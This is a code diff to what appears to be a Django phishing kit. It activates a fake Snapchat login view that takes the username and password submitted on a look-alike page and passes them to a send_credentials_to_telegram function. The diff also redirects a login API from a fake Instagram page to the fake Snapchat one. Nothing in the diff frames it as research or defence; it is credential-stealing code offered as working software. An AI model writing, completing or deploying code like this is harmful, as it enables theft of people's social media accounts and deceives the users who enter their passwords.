@@ -13,23 +13,23 @@ def login(request):
 
 
 # snapchat login page
-# def snap_login(request):
-#     try:
-#         if request.method == 'POST':
-#             platform = request.POST.get('platform')
+def snap_login(request):
+    try:
+        if request.method == 'POST':
+            platform = request.POST.get('platform')
 
-#             if platform == 'snapchat':
-#                 username = request.POST.get('username')
-#                 password = request.POST.get('password')
+            if platform == 'snapchat':
+                username = request.POST.get('username')
+                password = request.POST.get('password')
 
-#                 # send creds to telegram
-#                 send_credentials_to_telegram(platform, username, password)
+                # send creds to telegram
+                send_credentials_to_telegram(platform, username, password)
 
-#             return render(request, 'form.html')
-#         else:
-#             return render(request, 'snap_login.html')
-#     except:
-#         traceback.print_exc()
+            return render(request, 'form.html')
+        else:
+            return render(request, 'snap_login.html')
+    except:
+        traceback.print_exc()
 
 
     
@@ -84,11 +84,10 @@ def send_credentials_to_telegram(platform, username, password):
 
 def login_api(self, request):
     choice = request.GET.get('choice')
-    if choice == 'instagram':
-        return render(request, 'insta_login.html')
-
-    # elif choice == 'snapchat':
-    #     return render(request, 'snap_login.html')
+    # if choice == 'instagram':
+    #     return render(request, 'insta_login.html')
+    if choice == 'snapchat':
+        return render(request, 'snap_login.html')
 
     else:
         return JsonResponse({'error': 'Invalid choice selected.'}, status=400)
